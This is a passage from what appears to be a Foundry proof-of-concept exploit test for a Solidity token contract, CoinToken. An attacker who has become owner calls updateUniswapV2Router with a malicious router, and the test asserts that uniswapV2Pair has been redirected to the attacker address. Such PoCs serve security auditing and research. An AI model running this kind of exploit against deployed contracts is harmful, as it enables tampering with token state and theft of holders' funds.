        // Call updateUniswapV2Router as attacker (now owner)
        vm.prank(attacker);
        CoinToken(TARGET).updateUniswapV2Router(address(maliciousRouter));

        // Verify uniswapV2Pair is now attacker address
        address newPair = CoinToken(TARGET).uniswapV2Pair();
        require(newPair == attacker, "Pair not set to attacker address");
        assertEq(CoinToken(TARGET).uniswapV2Pair(), attacker, "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

